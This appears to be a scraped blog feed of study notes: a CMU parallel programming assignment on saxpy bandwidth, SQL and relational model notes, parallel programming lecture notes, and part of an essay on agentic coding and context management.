class="even"><td>Streaming</td><td>11.242</td><td>26.509</td><td>1.779</td><td>1.01x</td></tr><tr class="odd"><td><strong>ISPC</strong></td><td><strong>11.315</strong></td><td><strong>26.339</strong></td><td><strong>1.768</strong></td><td><strong>1.00x</strong></td></tr><tr class="even"><td><strong>Task ISPC</strong></td><td><strong>11.133</strong></td><td><strong>26.768</strong></td><td><strong>1.796</strong></td><td><strong>1.02x</strong></td></tr></tbody></table><p>The workload is <strong><u>memory bandwidth-bound</u></strong>. Saxpyaccesses large amounts of data but performs only 2 FLOPs. The processorspends far more time waiting for memory than computing. Despite saxpybeing trivially parallelizable, <u>ISPC and multi-core execution provideminimal ~1.00x speedup</u>. All implementations saturate atapproximately 26-27 GB/s, indicating we’ve <u>reached the memorybandwidth limit</u>.</p><p><u><strong>The program cannot be substantially improved throughparallelism alone.</strong></u> Adding more cores or SIMD lanes doesn’thelp when serial execution already maximize the memory bandwidth.Potential improvements require <u>reducing memory traffic</u> (e.g.,using non-temporal stores for the result vector to avoid cachepollution, reducing bandwidth from 4N to 3N floats) or <u>upgrading tohigher bandwidth memory hardware</u>.</p><h3 id="extra-credit-why-4n-instead-of-3n">5.2 Extra Credit: Why 4Ninstead of 3N?</h3><p>I think it’s because the cache’s behavior. Modern CPUs use awrite-allocate cache policy, meaning write operations must firstly loadthe target data into the cache before modifying it. This is required forcache coherence and locality optimization. So the additional N floats is<u>reading result cache lines</u>.</p><h3 id="extra-credit-what-else-factors-could-affect">5.3 Extra Credit:What else factors could affect?</h3><p>The observed bandwidth of 26-27 GB/s represents typical efficiencyfor DDR4 memory systems. The gap between observed and theoretical peakis due to:</p><ul><li><strong>DRAM timing overhead</strong>: DDR4 requires mandatorydelays between operations (CAS latency, row precharge time, refreshcycles) during which the memory bus is idle. These timing constraintstypically reduce effective bandwidth to 60-70% of theoretical peak.</li><li><strong>Memory controller efficiency</strong>: Bank conflicts,channel arbitration, and command scheduling in the memory controller addadditional overhead.</li></ul><h3 id="extra-credit-non-temporal-store-optimization">5.4 Extra Credit:Non-temporal Store Optimization</h3><p><strong>Implementation</strong>: Modified saxpyStreaming() using SSEintrinsics with <code>_mm_stream_ps</code> to bypass cache.</p><table><colgroup><col style="width: 19%" /><col style="width: 13%" /><col style="width: 23%" /><col style="width: 29%" /><col style="width: 13%" /></colgroup><thead><tr class="header"><th>Version</th><th>Time (ms)</th><th>Bandwidth (GB/s)</th><th>Performance (GFLOPS)</th><th>Speedup</th></tr></thead><tbody><tr class="odd"><td>Serial</td><td>11.124</td><td>26.791</td><td>1.798</td><td>1.00x</td></tr><tr class="even"><td><strong>Streaming</strong></td><td><strong>8.138</strong></td><td><strong>36.623</strong></td><td><strong>2.458</strong></td><td><strong>1.37x</strong></td></tr><tr class="odd"><td>ISPC</td><td>11.201</td><td>26.608</td><td>1.786</td><td>0.99x</td></tr><tr class="even"><td>Task ISPC</td><td>11.125</td><td>26.789</td><td>1.798</td><td>1.00x</td></tr></tbody></table><p>Non-temporal stores reduce memory traffic from 4N to 3N floats,achieving 1.37x speedup and bandwidth improvement from 26.8 GB/s to 36.6GB/s.</p>]]></content>
      
      
      <categories>
          
          <category> CMU 15-618 Parallel Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> 15618 </tag>
            
            <tag> Parallel Programming </tag>
            
            <tag> Assignment </tag>
            
            <tag> SIMD </tag>
            
            <tag> Pthreads </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database systems: Relational Model and SQL</title>
      <link href="/2026/01/16/15645-Database-Systems/15645-Database-Systems-relational-model-and-SQL/"/>
      <url>/2026/01/16/15645-Database-Systems/15645-Database-Systems-relational-model-and-SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-1-relational-model">Lec 1 Relational Model</h1><h2 id="terminology">Terminology</h2><ul><li><p>A <u><strong>database management system</strong></u> (DBMS) issoftware that allows applications to store and analyze information in adatabase, and it should support the <u>definition. creation, querying,update, and administration of databases in accordance with some datamodel</u>.’</p></li><li><p>A <strong><u>data model</u></strong> is a collection of<strong>concepts</strong> for describing the data in a database.(e.g. relationship or documentation)</p></li><li><p>A <strong><u>schema</u></strong> is a description of a particularcollection of data, using a given data model. (e.g. table structuredesign)</p></li><li><p>A <strong><u>relation</u></strong> is an unordered set thatcontain the relationship of attributes that represent entities.(e.g. table or container)</p></li><li><p>A <strong><u>tuple</u></strong> is a set of attribute values (akaits <strong>domain</strong>) in the relation. (e.g. data entry in thetable)</p></li></ul><blockquote><p>DBMS can auto-generation unique primary keys via an identitycolumn:</p><ul><li><p><strong>IDENTITY</strong> (SQL Standard)</p></li><li><p><strong>SEQUENCE</strong> (PostgreSQL / Oracle) <strong>Globally,others are bind with column</strong></p></li><li><p><strong>AUTO_INCREMENT</strong> (MySQL)</p></li></ul></blockquote><h2 id="relational-algebra">Relational Algebra</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115225646566.png" alt="image-20260115225646566" style="zoom:30%;" /></p><h1 id="lec-2-modern-sql">Lec 2 Modern SQL</h1><p>SQL is based on bags (duplicates, like multisite) not sets (noduplicates).</p><blockquote><p>Terminologies:</p><ul><li>Data Manipulation Language (DML)</li><li>Data Definition Language (DDL)</li><li>Data Control Language (DCL)</li></ul></blockquote><p>Execution order:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM / JOIN</span><br><span class="line">→ WHERE</span><br><span class="line">→ GROUP BY</span><br><span class="line">→ 聚合函数（AVG / COUNT / …）</span><br><span class="line">→ HAVING</span><br><span class="line">→ SELECT</span><br><span class="line">→ ORDER BY</span><br><span class="line">→ LIMIT</span><br></pre></td></tr></table></figure><h2 id="aggregates">Aggregates</h2><p>Functions that return a single value from a bag of tuples:</p><ul><li><strong>AVG(col)</strong>→ Return the average col value.</li><li><strong>MIN(col)</strong>→ Return minimum col value.</li><li><strong>MAX(col)</strong>→ Return maximum col value.</li><li><strong>SUM(col)</strong>→ Return sum of values in col.</li><li><strong>COUNT(col)</strong>→ Return # of values for col.</li></ul><blockquote><p>COUNT(*) counts rows, COUNT(1) counts a constant value per row (whichis never NULL), so they are equivalent; only COUNT(column) can differ<strong>because it ignores NULLs.</strong></p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117180637261.png" alt="image-20260117180637261" style="zoom:30%;" /></p><p>In the above picture, the AVG(s.gpa) is only a single value, bute.cid may have multiple values, so the DB don’t know how to choose avalue for the column, we should use ANY_VALUE() to explicitly tell DBhow to choose.</p><h2 id="group-by">Group By</h2><p>Project tuples into subsets and calculate aggregates against eachsubset</p><blockquote><p>Group by happlens after FROM/JOIN/WHERE but before the aggregatefunction.</p></blockquote><h2 id="grouping-sets">Grouping Sets</h2><p>Specify multiple groupings in a single query instead of using<strong>UNION ALL</strong> to combine the results of several individual<strong>GROUP BY</strong> queries.</p><h2 id="filter">Filter</h2><p>Qualify results <strong><u>pre aggregationcomputatio</u></strong>n. Aggregation group membership qualifier.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117182334070.png" alt="image-20260117182334070" style="zoom:40%;" /></p><h2 id="having">Having</h2><p>Filters results <strong><u>post-aggregationcomputation</u></strong>.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117182730554.png" alt="image-20260117182730554" style="zoom:50%;" /></p><p>This indicats that having happens before the select, so the nameavg_gpa is not generated yet.</p><h2 id="string-operations">String Operations</h2><ul><li><strong>LIKE</strong> provides string matching with special matchoperators:<ul><li>‘%’ Matches any substring (including empty strings)</li><li>’_’ Match any one character</li></ul></li><li><strong>SIMILAR TO</strong> allows for regular expression matching<ul><li>In the SQL standard but not all systems support it</li><li>Other systems also support POSIX-style regular expressions</li></ul></li><li><strong>SUBSTRING</strong></li><li><strong>UPPER</strong></li><li><strong>||</strong> : concatenate two or more strings(this couldalso be + or CONCAT() function)</li></ul><h2 id="datetime-operations">Date/Time Operations</h2><p>Date/time operations manipulate temporal values and are DBMS-specificin syntax and behavior.</p><h2 id="output-control"><strong>Output Control</strong></h2><p>Output control clauses determine the order and the number of rowsreturned by a query.</p><ul><li><strong>ORDER BY</strong>: <u>ORDER BY column [ASC | DESC]</u> Sorttuples by the values in one or more of their columns</li><li><strong>FETCH</strong>: <u>FETCH {FIRST|NEXT} &lt;#&gt; ROWS OFFSET&lt;#&gt; ROWS</u><ul><li>Limit # of tuples returned in output</li><li>Can set an offset to return a “range”</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117184442310.png" alt="image-20260117184442310" style="zoom:40%;" /></p><h2 id="output-redirection">Output Redirection</h2><p>Store query results in another table:</p><ul><li>Table must not already be defined</li><li>Table will have the same # of columns with the same types as theinput</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117184804759.png" alt="image-20260117184804759" style="zoom:33%;" /></p><h2 id="nested-queries">Nested Queries</h2><p>Invoke a query inside of another query to compose more complexcomputations:</p><blockquote><p>Innter queries can appear almost anywhere in query</p></blockquote><ul><li>ALL: The expression must be true for all rows in the sub-query.</li><li>ANY: The expression must be true for at least one row in thesub-query.</li><li>IN: Equivalent to ‘<strong>=ANY()</strong>’ .</li><li>EXISTS: At least one row is returned without comparing it to anattribute in outer query</li></ul><h2 id="lateral-joins">Lateral Joins</h2><p>The lateral operator allows a nested query to reference attributes inother nested queries that preced it (according to postition in thequery)</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117211328677.png" alt="image-20260117211328677" style="zoom:40%;" /></p><h2 id="common-table-expression">Common Table Expression</h2><p>Specify a temporary result set that can then be referenced by anotherpart of that query.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260117211619436.png" alt="image-20260117211619436" style="zoom:40%;" /></p><h2 id="window-functions">Window Functions</h2><p>Performs a calculation across a set of tuples that are related tocurrent tuple, without collapsing them into a single output tuple, tosupport running totals, ranks, and moving averages.</p><p>Special window functions:</p><ul><li>ROW_NUMBER() # of the current row</li><li>RANK() Order position of the current</li></ul><blockquote><p>The <strong>OVER</strong> keyword specifies how to group togethertuples when computing the window function.</p><p>Use <strong>PARTITION BY</strong> to specify group</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 Database Systems </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Database Systems </tag>
            
            <tag> Database </tag>
            
            <tag> 15645 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15618 Parallel Programming Lecture (1-4) Notes</title>
      <link href="/2026/01/16/15618-Parallel-Programming/15618-Parallel-Programming-Lecture-Notes/"/>
      <url>/2026/01/16/15618-Parallel-Programming/15618-Parallel-Programming-Lecture-Notes/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="lec-1-why-parallelism-why-efficiency">Lec 1 Why Parallelism? WhyEfficiency?</h1><h2 id="a-brief-history-of-processor-performace">A brief history ofprocessor performace</h2><ul><li><p>Wider data path (bits width)</p></li><li><p>More efficient pipelining (3.5 Cycles Per Instruction (CPI) → 1.1CPI )</p></li><li><p>Instruction level parallelism(ILP) e.g.,<strong>superscalar</strong> processing</p></li><li><p>Faster clock rates(<strong>most important</strong>) e.g., 10 MHz→ 200 MHz → 3 GHz</p></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115123917522.png" alt="image-20260115123917522" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115124003572.png" alt="image-20260115124003572" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115124019432.png" alt="image-20260115124019432" style="zoom:33%;" /></p><h2 id="what-is-a-parallel-computer">What is a parallel computer?</h2><p>A common definition:</p><p>A parallel computer is a <strong>collection of processingelements</strong> that <strong>cooperate</strong> to <strong>solveproblems quickly</strong>. <span class="math display">\[Speedup(using\ P\ processors) = \frac{execution\ time (using\ 1\processor)}{execution\ time (using\ P\ processors)}\]</span> Some overservation of the speedup:</p><ul><li>Communication limited the maximum speedup achieved (may<strong>dominate</strong> a parallel computation)</li><li>Minimizing the cost the communication improves speedup</li><li>Imbalance in work assignment limited speedup</li><li>Improving the distribution of work improved speedup</li></ul><h2 id="shift-in-cpu-deisgn-philosophy">Shift in CPU DeisgnPhilosophy</h2><p>Maximize <strong>performace</strong>(ILP) -&gt; Maximize<strong>performance per area</strong> (cpres/chip) -&gt; Maximize<strong>performance per Watt</strong></p><p><u>upshot</u>: major focus on <strong>efficiency ofcores</strong></p><hr /><h1 id="lec-2-a-moredern-multi-core-processor">Lec 2 A MoredernMulti-Core Processor</h1><h2 id="parallel-execution">Parallel execution</h2><p><strong>Compute sin(x) using Taylor expansion:</strong> sin(x) = x -x³/3! + x⁵/5! - x⁷/7! + …</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sinx</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> terms, <span class="type">float</span>* x, <span class="type">float</span>* result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">float</span> value = x[i];</span><br><span class="line">        <span class="type">float</span> numer = x[i] * x[i] * x[i];</span><br><span class="line">        <span class="type">int</span> denom = <span class="number">6</span>;  <span class="comment">// 3!</span></span><br><span class="line">        <span class="type">int</span> sign = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>; j&lt;=terms; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            value += sign * numer / denom;</span><br><span class="line">            numer *= x[i] * x[i];</span><br><span class="line">            denom *= (<span class="number">2</span>*j+<span class="number">2</span>) * (<span class="number">2</span>*j+<span class="number">3</span>);</span><br><span class="line">            sign *= <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        result[i] = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The idea to boost the efficiency of the progeam is as follows.</p><h3 id="multi-cores">Multi Cores</h3><p>Use increasing transistor count to add more cores to theprocessor</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141242348.png" alt="image-20260115141242348" style="zoom: 33%;" /></p><h3 id="more-alus">More ALUs</h3><p>Amortize cost/complexity of managing an instruction stream acrossmany ALUs</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141328877.png" alt="image-20260115141328877" style="zoom:40%;" /></p><div class="note info flat"><p><strong>SIMD processing</strong> (Single instruction, multiple data):Same instruction broadcast to all ALUs and Executed in parallel on allALUs</p></div><p><strong>Scalar Program vs. Vector Program</strong>: Scalar: oneoperation per register. Vector: multiple operations per register usingSIMD.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115141737878.png" alt="image-20260115141737878" style="zoom:33%;" /></p><p>The picture above shows that conditional code(if - else) could<strong>recude the efficiency</strong> of multi ALUs architecture.Because <strong>only one instruction can be executed at a time</strong>in the same processor, so there may some ALUs are idle, we use<strong>mask to discard the output</strong> of some ALUs.</p><h3 id="simd-terminology">SIMD Terminology</h3><p><strong>Instruction Stream Coherence vs. DivergentExecution</strong></p><ul><li><strong>Coherent execution</strong>: All elements execute the sameinstruction sequence simultaneously (efficient for SIMD)</li><li><strong>Divergent execution</strong>: Different elements needdifferent instruction paths (inefficient for SIMD, e.g., if-elsebranches)</li></ul><p><strong>SSE vs. AVX</strong></p><ul><li><strong>SSE</strong>: 128-bit operations (4-wide float vectors)</li><li><strong>AVX</strong>: 256-bit operations (8-wide float vectors)</li></ul><p><strong>Explicit SIMD vs. Implicit SIMD</strong></p><ul><li><strong>Explicit SIMD</strong>: Programmer explicitly writes SIMDcode using intrinsics or parallel constructs; vectorization done atcompile time</li><li><strong>Implicit SIMD (Auto-vectorization)</strong>: Compilerautomatically detects and converts scalar loops to SIMDinstructions</li></ul><h3 id="summary">Summary</h3><p><strong>Multi-core</strong></p><ul><li><strong>What</strong>: Multiple cores execute different threadssimultaneously</li><li><strong>Control</strong>: Programmer creates threads (e.g.,pthreads)</li><li><strong>Parallelism</strong>: Thread-level parallelism</li></ul><p><strong>SIMD</strong></p><ul><li><strong>What</strong>: Single instruction operates on multiple dataelements</li><li><strong>Control</strong>: Compiler (explicit SIMD) or hardware(implicit)</li><li><strong>Parallelism</strong>: Data-level parallelism</li></ul><p><strong>Superscalar</strong></p><ul><li><strong>What</strong>: Multiple instructions from same threadexecute in parallel</li><li><strong>Control</strong>: Hardware automatically discoversparallelism at runtime</li><li><strong>Parallelism</strong>: Instruction-level parallelism(ILP)</li><li><strong>Note</strong>: Not covered in this course (belongs toarchitecture courses like 18-447)</li></ul><h2 id="accessing-memory">Accessing Memory</h2><h3 id="stalls">Stalls</h3><p>A processor “<strong>stalls</strong>” when it cannot run the nextinstruction in an instruction stream because of a dependency on aprevious instruction.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115142855628.png" alt="image-20260115142855628" style="zoom:40%;" /></p><p>Ways to recude stalls:</p><ul><li><p><strong>Prefetching</strong>: All modern CPUs have logic forprefetching data into caches</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143654668.png" alt="image-20260115143654668" style="zoom: 50%;" /></p></li><li><p><strong>Multi-Threading</strong>: Interleave processing ofmultiple threads on the same core to hide stalls</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143214758.png" alt="image-20260115143214758" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143626898.png" alt="image-20260115143626898" style="zoom: 33%;" /></p></li></ul><p>Core needs to manage execution context for multiple threads. And aexample of count methods for different concepts.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115143926553.png" alt="image-20260115143926553" style="zoom:33%;" /></p><h3 id="gpu-vs.-cpu">GPU vs. CPU</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115144059525.png" alt="image-20260115144059525" style="zoom: 33%;" /></p><h3 id="bandwith-limited">Bandwith Limited</h3><p>Due to <strong>high arithmetic capability</strong> on modern chips,many parallel applications (on both CPUs and GPUs) are bandwidthbound.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260115144345891.png" alt="image-20260115144345891" style="zoom: 33%;" /></p><h1 id="lec-3-parallel-programming-abstractions">Lec 3 ParallelProgramming Abstractions</h1><h2 id="intel-spmd-program-compiler-ispc">Intel SPMD Program Compiler(ISPC)</h2><p>SPMD refers to single program multiple data, and call to ISPCfunction spawns “<u>gang</u>” of ISPC “<u>programming instances</u>(SIMD lanes)”. All instances run ISPC code concurrently.</p><blockquote><p>Gang is the vector width level concept</p></blockquote><h3 id="interleaved-version">Interleaved Version</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116095110149.png" alt="image-20260116095110149" style="zoom:33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116095416655.png" alt="image-20260116095416655" style="zoom:33%;" /></p><h3 id="blocked-version">Blocked Version</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116100317569.png" alt="image-20260116100317569" style="zoom:33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116100327583.png" alt="image-20260116100327583" style="zoom:33%;" /></p><blockquote><p><strong>Which is faster?</strong> A: The <strong>interleaved</strong>one is faster.</p><p>The interleaved one use **_mm_load_ps1** to load these continuousdata, but the blocked one need to use **_mm_i32gather**, which is morecomplex and slower.</p></blockquote><blockquote><p>For ISPC, we cannot add a varying number with a uniform number, andit will reject the code during the compile time.</p></blockquote><h2 id="four-models-of-communication">Four models of communication</h2><h3 id="shared-address-space-very-little-structure">Shared addressspace: very little structure</h3><p>Threads communicate by</p><ul><li>Reading/writing to shared variables.</li><li>Manipulating synchronization primitives</li></ul><blockquote><p>Synchronization primitives are also shared variables. e.g., locks,semaphore</p></blockquote><p><strong>Hardware implementation of a shared addressspace</strong></p><p>Key idea: any processor can <u><strong>directly</strong></u>inference any memory location</p><ul><li><p>Symmetric (shared-memory) multi-processor(<strong>SMP</strong>) :uniform memory access time</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116113230688.png" alt="image-20260116113230688" style="zoom: 33%;" /></p></li><li><p>Non-uniform memory access(<strong>NUMA</strong>): All processorscan access any memory location, but the cost of memory access isdifferent for processors.</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116113407652.png"alt="image-20260116113407652" /><figcaption aria-hidden="true">image-20260116113407652</figcaption></figure></li></ul><blockquote><p>Uniform: costs are uniform but are uniformly bad</p><p>NUMA: more scalable</p></blockquote><h3 id="message-passing-highly-structured-communication">Messagepassing: highly structured communication</h3><p>Threads operate within their own private space, and they communicateby <strong><u>sending/receiving messages</u></strong></p><p>Popular software library: <strong>MPI(message passinginterface)</strong></p><blockquote><p>Programming models and hardware architectures do not have aone-to-one correspondence: message passing can be implemented onshared-memory hardware, and shared-memory abstractions can be emulatedon machines without hardware support, usually with performancetrade-offs.</p></blockquote><h3 id="data-parallel-very-rigid-computation-structure">Data parallel:very rigid computation structure</h3><p>Data-parallel programming maps independent computations over largedata collections; by restricting communication and side effects, itenables simple reasoning and high-performance implementations, thoughirregular access patterns like <strong><u>gather/scatter</u></strong>are costly.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116115517345.png" alt="image-20260116115517345" style="zoom: 33%;" /></p><h3 id="systolic-arrays">Systolic arrays</h3><p><u>Target domain</u>: data-intensive applications where<strong>memory bandwidth</strong> is the<strong>bottleneck</strong>.</p><p>And because the memory bandwidth is the critical resource, so wereally want to <strong>avoid accessing memory unnecessarily.</strong> Sowe need to <strong>perform all necessary computation on theprocessor</strong> before writing back any results, usually by<strong>directly pipelining intermediate results betweenprocessors</strong>.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116120138219.png" alt="**image-20260116120138219**" style="zoom: 33%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260116120212339.png" alt="image-20260116120212339" style="zoom:33%;" /></p><blockquote><p>Modern practice: mixed programming models</p><p>Use <u>shared address space</u> programming within a <u>multi-corenode</u> of a cluster, use <u>message passing</u> between nodes.</p></blockquote><h1 id="lec-4-parallel-programming-basics">Lec 4 Parallel ProgrammingBasics</h1><h2 id="creating-a-parallel-program">Creating a parallel program</h2><p>Thought process:</p><ol type="1"><li>Identify work that can be performed in parallel</li><li>Partition work (and also data associated with the work)</li><li>Manage <strong>data access</strong>, <strong>communication</strong>,and <strong>synchronization</strong></li></ol><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260121094725347.png" alt="image-20260121094725347" style="zoom:35%;" /></p><h3 id="decomposition">Decomposition</h3><p>Break up problem into <strong><u>tasks</u></strong> that can be<strong>carried out in parallel</strong></p><p><strong>Main idea</strong>: Create at least enough tasks to keep allexecution units on a machine busy.</p><p><strong>Amdahl’s law</strong>: Dependencies limit maximum speedup dueto parallelism. Then <strong><u>the maximum speed up due to parallelexecution &lt;= 1 / S</u></strong>. <span class="math display">\[\text{speedup} \leq \frac{1}{s + \frac{1-s}{p}}\]</span></p><h3 id="assignment">Assignment</h3><p>Assigning tasks to threads</p><p><strong><u>Goals</u></strong>: balance workloadm reduce communicationcosts</p><h3 id="orchestration">Orchestration</h3><ul><li>Structuring communication</li><li>Adding synchronization to preserve dependencies if necessary</li><li>Organizing data structures in memory</li><li>Scheduling tasks</li></ul><p><strong><u>Goals</u></strong>: reduce <strong>costs ofcommunication/sync</strong>, preserve <strong>locality</strong> of datareference, reduce <strong>overhead</strong>, etc.</p><h3 id="mapping-to-hardware">Mapping to hardware</h3><p>Mapping “threads”(“workerss”) to hardware execution units</p><ul><li>Mapping by the <strong><u>operating system</u></strong> (e.g., mappthread to HW execution contect on a CPU core)</li><li>Mapping by the <strong><u>complier</u></strong> (Map ISPC programinstances to vector instruction lanes)</li><li>Mapping by the <strong><u>hardware</u></strong> (Map CUDA threadblocks to GPU cores)</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 15-618 Parallel Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> 15618 </tag>
            
            <tag> Parallel Programming </tag>
            
            <tag> Systems </tag>
            
            <tag> Performance Optimization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deconstructing Agentic Coding with First Principles: From Theory to Practice</title>
      <link href="/2026/01/12/Personal/Deconstructing%20Agentic%20Coding%20with%20First%20Principles:%20From%20Theory%20to%20Practice/"/>
      <url>/2026/01/12/Personal/Deconstructing%20Agentic%20Coding%20with%20First%20Principles:%20From%20Theory%20to%20Practice/</url>
      
        <content type="html"><![CDATA[<h1id="in-depth-summary-first-principles-and-engineering-practices-of-agentic-coding">In-DepthSummary: First Principles and Engineering Practices of AgenticCoding</h1><h3 id="i.-core-contradiction-ais-limited-memory-vs.-infinite-tasks">I.Core Contradiction: AI’s “Limited Memory” vs. “Infinite Tasks”</h3><p>The essence of Agentic Coding is to enable LLMs to use tools tocomplete programming tasks. However, all agents currently face aphysical ceiling: <strong>the scarcity of context windows andinstruction saturation</strong>.</p><ul><li><strong>Instruction Saturation Limit</strong>: Research shows thatcutting-edge models can reliably follow only about <strong>150-200instructions</strong>.</li><li><strong>System Prompt Usage</strong>: The configuration of agentsystems (such as environmental awareness and tool definitions) oftenoccupies <strong>about 50 instructions</strong>, leaving extremelylimited space for user customization.</li><li><strong>Common Pain Points for Code Agents</strong>: Due to contextinflation, agents can easily fall into “hallucination loops,” forgettheir initial goals, or lose control in complex long tasks.</li></ul><h3id="ii.-implementation-principles-transitioning-from-react-to-reinforcement-learning-rl">II.Implementation Principles: Transitioning from ReAct to ReinforcementLearning (RL)</h3><p>The blog delves into the underlying operational logic of agents,specifically how to transform LLMs into entities that can “think andexecute”:</p><ul><li><strong>Planning &amp; Reasoning</strong>: Agents adopt a modelsimilar to <strong>ReAct</strong> (Reason + Act), breaking tasks downinto executable atomic operations.</li><li><strong>Injection of Reinforcement Learning (RL)</strong>: ThroughRL training, agents gain better <strong>self-correctionabilities</strong> when facing tool invocation failures.</li><li><strong>Prompt Caching: A Key Engineering Practice</strong>:</li><li><strong>Core Mechanism: Prefix Matching</strong>: Caching is basedon prefix matching, where a cache hit occurs only when the<strong>beginning part</strong> of a new request exactly matches apreviously cached request.</li><li><strong>Structured Organization</strong>: To maximize hit rates,prompts must be arranged by <strong>stability from high to low</strong>:<ol type="1"><li><strong>System Prompt</strong> (Role definition, behavioralguidelines): Stable and unchanging, cached first.</li><li><strong>Tool Definitions</strong> (Tool Schema definitions): Stableand unchanging, can be cached.</li><li><strong>Project Context</strong> (Project description, codingstandards): Relatively stable, should change as little as possible.</li><li><strong>Conversation History</strong> (Dialogue history):Dynamically growing, placed last, not affecting the cache hits of theprevious three layers.</li></ol></li></ul><h3id="iii.-context-management-from-brute-force-transmission-to-refined-operations">III.Context Management: From “Brute Force Transmission” to “RefinedOperations”</h3><p>To address “memory loss between conversations” and token explosion,the blog proposes refined filtering strategies:</p><ol type="1"><li><strong>Observation Masking</strong>:<ul><li><strong>Core</strong>: Retain key reasoning logic and actioninstructions, but replace lengthy tool return results (such as massivelogs or entire source code) with “content omitted.”</li></ul></li><li><strong>LLM Summarization</strong>:<ul><li><strong>Deep Insight</strong>: Utilize the model to dynamicallycompress history. While this resolves length issues, care must be takento avoid “decision drift” due to loss of details.</li></ul></li><li><strong>Task Decomposition and Short Dialogue Mode</strong>:<ul><li><strong>Core</strong>: The main strategy is to adopt a<strong>“short dialogue, concise context”</strong> mode, breakingcomplex tasks into focused sub-dialogues to avoid performancedegradation from overly long single sessions.</li></ul></li></ol><h3id="iv.-developer-experience-dx-building-compounding-engineering-for-ai">IV.Developer Experience (DX): Building “Compounding Engineering” forAI</h3><p>A profound point made in the blog is that <strong>improving developerexperience has dual value</strong>.</p><ul><li><strong>Structured External Memory</strong>:<ul><li><strong>Task Tracking</strong>: Use Issue Trackers or<code>TODO.md</code> to make progress “persistent” on disk, solvingmemory loss issues after session restarts.</li><li><strong>Fixed Location for Decision Records</strong>: Place corearchitectural decisions (ADR) in a fixed location rather than buryingthem in dialogue history.</li></ul></li><li><strong>Compounding Engineering</strong>:<ul><li>Consolidate daily experiences like bug fixes and code reviews into areusable <strong>project knowledge base</strong>.</li></ul></li><li><strong>Environmental Investment</strong>: Clear READMEs, quick unittests, and automated Linters serve as excellent “external indexes” forAI, significantly enhancing its 